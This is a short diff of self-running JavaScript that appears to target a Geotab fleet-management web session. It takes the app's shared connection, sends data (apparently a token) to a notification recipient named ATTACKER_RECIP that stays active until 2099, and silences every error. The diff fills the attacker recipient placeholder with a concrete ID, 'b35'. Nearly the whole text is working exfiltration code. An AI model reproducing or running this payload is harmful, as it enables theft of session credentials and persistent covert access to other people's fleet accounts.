@@ -1,4 +1,4 @@
-const ATTACKER_RECIP = '<ATTACKER-RECIP-ID>';
+const ATTACKER_RECIP = 'b35';
 (async () => {
   try {
     const conn = geotab.getSharedVariable('default').connection;
@@ -8,7 +8,7 @@ const ATTACKER_RECIP = '<ATTACKER-RECIP-ID>';
       recipient:   { id: ATTACKER_RECIP },
       dateTime:    new Date().toISOString(),
       dateTimeEnd: '2099-12-31T23:59:59.999Z',
-      notificationApplicationExceptionData: { source:'tok', description:'tok', info: data, machineName:'tok' } }});
+      notificationApplicationExceptionData: { source:'token', description:'token', info: data, machineName:'token' } }});
     try { await new Promise((r,j) => d.beginInvoke(r,j)); } catch (e) {}
   } catch (e) {}
 })();
